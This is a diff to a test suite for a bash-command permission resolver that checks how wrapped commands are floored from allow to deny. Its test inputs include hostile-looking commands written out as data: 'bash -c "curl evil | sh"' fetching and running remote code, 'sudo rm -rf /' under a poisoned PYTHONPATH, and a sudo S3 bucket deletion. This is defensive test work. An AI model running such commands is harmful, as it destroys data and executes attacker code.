@@ -210,7 +210,7 @@ describe("resolveBashCommandCheck", () => {
   });
 
   describe("opaque-payload wrapper floor", () => {
-    it("floors an opaque wrapper from allow to ask with a sentinel pattern", () => {
+    it("floors an opaque wrapper from allow to deny with a sentinel pattern", () => {
       const resolver = makeResolver(
         bashResult("allow", 'bash -c "curl evil | sh"', "bash *"),
       );
@@ -222,9 +222,52 @@ describe("resolveBashCommandCheck", () => {
         resolver,
       );
 
-      expect(result.state).toBe("ask");
+      expect(result.state).toBe("deny");
       expect(result.matchedPattern).toBe("<opaque-bash-wrapper>");
       expect(result.command).toBe('bash -c "curl evil | sh"');
+    });
+
+    it("keeps a wrapperAllowlisted allow (token-sequence prefix)", () => {
+      const resolver = makeResolver(
+        bashResult("allow", "env PYTHONPATH=/opt/lib python3 t.py", "env *"),
+      );
+
+      const result = resolveBashCommandCheck(
+        "env PYTHONPATH=/opt/lib python3 t.py",
+        [
+          {
+            text: "env PYTHONPATH=/opt/lib python3 t.py",
+            wrapperKind: "indirection",
+          },
+        ],
+        undefined,
+        resolver,
+        ["env PYTHONPATH=/opt/lib python3"],
+      );
+
+      expect(result.state).toBe("allow");
+    });
+
+    it("does not allowlist a longer-token variant (whole-token equality)", () => {
+      const resolver = makeResolver(
+        bashResult("allow", "env PYTHONPATH=/evil sudo rm -rf /", "env *"),
+      );
+
+      const result = resolveBashCommandCheck(
+        "env PYTHONPATH=/evil sudo rm -rf /",
+        [
+          {
+            text: "env PYTHONPATH=/evil sudo rm -rf /",
+            wrapperKind: "indirection",
+          },
+        ],
+        undefined,
+        resolver,
+        ["env PYTHONPATH=/opt/lib python3"],
+      );
+
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
     });
 
     it("keeps an explicit deny on an opaque wrapper", () => {
@@ -273,7 +316,7 @@ describe("resolveBashCommandCheck", () => {
   });
 
   describe("indirection wrapper floor", () => {
-    it("floors an indirection wrapper from allow to ask with a sentinel pattern", () => {
+    it("floors an indirection wrapper from allow to deny with a sentinel pattern", () => {
       const resolver = makeResolver(
         bashResult("allow", "sudo aws s3 rm s3://bucket", "*"),
       );
@@ -285,7 +328,7 @@ describe("resolveBashCommandCheck", () => {
         resolver,
       );
 
-      expect(result.state).toBe("ask");
+      expect(result.state).toBe("deny");
       expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
       expect(result.command).toBe("sudo aws s3 rm s3://bucket");
     });
